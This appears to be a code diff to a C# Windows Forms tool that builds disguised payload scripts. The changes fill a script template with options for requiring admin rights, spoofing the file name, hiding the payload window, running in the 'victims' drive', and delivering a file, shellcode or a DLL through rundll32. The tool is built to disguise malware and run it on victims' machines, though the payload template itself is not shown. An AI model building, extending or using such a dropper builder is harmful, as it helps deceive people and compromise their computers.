@@ -21,7 +21,7 @@ namespace masamangalternatibo {
     public partial class Form1 : Form {
         public Form1() { InitializeComponent(); }
 
-        string version = "0.7.0a";
+        string version = "0.8.0a";
         int payloadMode = 0; // 0 = File payload // 1 = Shell Code payload // 2 = Load DLL to rundll32
         string[] payloadData = new string[6]; //Stores the data from the textbox so the user can switch modes without losing the last settings Index 0-2: Stores the mode data // Index 3-4: Stores the arguments // Index 5: argument placeholder for shell mode (opposed for efficiency rather than doing heavy math and comparisons)
         string[] payloadFile = new string[2]; // Stores the data of ofdPayload.FileName incase the user switches modes // 0 = File Payload // 1 = DLL Payload
@@ -355,7 +355,7 @@ namespace masamangalternatibo {
         }
 
         /*
-        Start Build Function - a function that generates the payload script with corresponding code from the options provided by the user.
+        Start Build Function - a function that generates the payload script with the corresponding options provided by the user.
         ---------------------------------------------------------------------------------------------------------------------------------------
          stratBuild(
                 Is in write mode (bool)
@@ -364,6 +364,24 @@ namespace masamangalternatibo {
         *returns: nothing
         */
         private void startBuild(bool isWriteMode) {
+
+            /*
+             * scriptData Array String Variable - Stores the temporary data to be written in the script through String.Format
+             * ---------------------------------------------------------------------------------------------------------------
+             * Index Representation Values
+             *   0  - #RequireAdmin pre-processor
+             *   1  - Payload arguments placeholder (string)
+             *   2  - Execute through console (bool)
+             *   3  - Stream console output to a text file (bool)
+             *   4  - Execute in victims' drive (bool)
+             *   5  - Payload name (string)
+             *   6  - Spoofed File name (string)
+             *   7  - Hide/Show Payload Window (Macro | @SW_SHOW / @SW_HIDE)
+             *   8  - Console command execution switch (String | /k or /c)
+             *   9  - Type of payload (integer | 0 = payload / 2 = dll payload / 3 = shell code)
+            */
+            string[] scriptData = new string[10];
+
             dbgmsg("Starting build...");
             dbgmsg("Importing template...");
 
@@ -383,15 +401,27 @@ namespace masamangalternatibo {
             }
             File.Copy(ofdSpoof.FileName, "$spooftmp");
 
-            dbgmsg("Writing common sections...");
-            templateData = String.Format(templateData, (chkAdminFlag.Checked ? "#RequireAdmin" : ""), "", "", "", "", "", "", "", "", "", payloadMode);
-            switch (payloadMode) {
-                case 0:
-                    break;
-                case 1:
-                    break;
-                case 2:
-                    break;
+            dbgmsg("Writing sections...");
+            scriptData[0] = (chkAdminFlag.Checked ? "#RequireAdmin":"");
+            scriptData[1] = ((payloadMode != 2 && chkArguments.Checked) ? tbArguments.Text : tbPayload.Text);
+            scriptData[2] = ((payloadMode == 0 && chkConsole.Checked) ? "true" : "false");
+            scriptData[3] = ((payloadMode == 0 && chkConsole.Checked && chkStreamConsole.Checked) ? "true" : "false");
+            scriptData[4] = ((payloadMode == 0 && chkTarExe.Checked) ? "true" : "false");
+            scriptData[5] = ((payloadMode != 2) ? tbPayload.Text : "");
+            scriptData[6] = tbSpoof.Text;
+            scriptData[7] = (chkHidWin.Checked ? "@SW_HIDE":"@SW_SHOW");
+            scriptData[8] = ((payloadMode == 0 && chkConsole.Checked) ? btnCommand.Text : "");
+            scriptData[9] = payloadMode.ToString();
+
+            dbgmsg("Writing parsed script to memory...");
+            templateData = String.Format(templateData, scriptData[0], scriptData[1], scriptData[2], scriptData[3], scriptData[4], scriptData[5], scriptData[6], scriptData[7], scriptData[8], scriptData[9]);
+
+            if (payloadMode == 2) {
+                dbgmsg("Creating Payload placeholder...");
+                if (File.Exists("$payloadtmp")) {
+                    File.Delete("$payloadtmp");
+                }
+                File.Create("$payloadtmp");
             }
 
             if (isWriteMode) {
